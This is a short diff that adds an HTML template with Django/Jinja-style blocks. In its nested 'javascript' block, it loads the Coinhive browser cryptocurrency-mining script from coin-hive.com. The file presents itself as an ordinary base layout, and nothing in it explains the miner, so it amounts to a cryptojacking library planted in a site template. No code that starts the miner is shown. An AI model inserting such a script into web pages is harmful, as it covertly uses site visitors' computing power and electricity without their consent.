@@ -1,0 +1,20 @@
+{% comment %}
+{% extends "base.html" %}
+{% endcomment %} 
+
+<html><body>
+
+{% block content %}
+{% endblock content %}
+
+<!-- Their site uses old school block layout -->
+{% block extra_js %}
+
+  <!-- Your package using 2SoD block layout -->
+  {% block javascript %}
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  {% endblock javascript %}
+
+{% endblock extra_js %}
+
+</body></html>
